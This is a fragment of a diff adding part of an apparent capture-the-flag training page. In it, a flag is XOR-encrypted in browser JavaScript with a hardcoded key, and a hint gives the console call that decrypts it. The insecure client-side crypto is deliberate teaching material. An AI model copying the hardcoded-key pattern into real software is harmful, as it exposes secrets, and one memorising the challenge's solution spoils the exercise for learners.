+  document.body.innerHTML = '&lt;p&gt;Encrypted: ' + encryptedFlag + '&lt;/p&gt;';
+
+  // To decrypt, use the same XOR function (XOR is symmetric)
+  // xorEncrypt(atob(encryptedFlag), SECRET_KEY) === original text
+&lt;/script&gt;</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Everything is in the client-side JavaScript — open DevTools and read the source.<br>
+            The <code>SECRET_KEY</code> is hardcoded. Call <code>xorEncrypt(atob(encryptedFlag), SECRET_KEY)</code> in the console.<br>
+            XOR encryption is symmetric: encrypting twice with the same key gives the original plaintext.<br>
+            Lesson: never do security-critical crypto client-side.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
     </div>
   </body>
 </html>
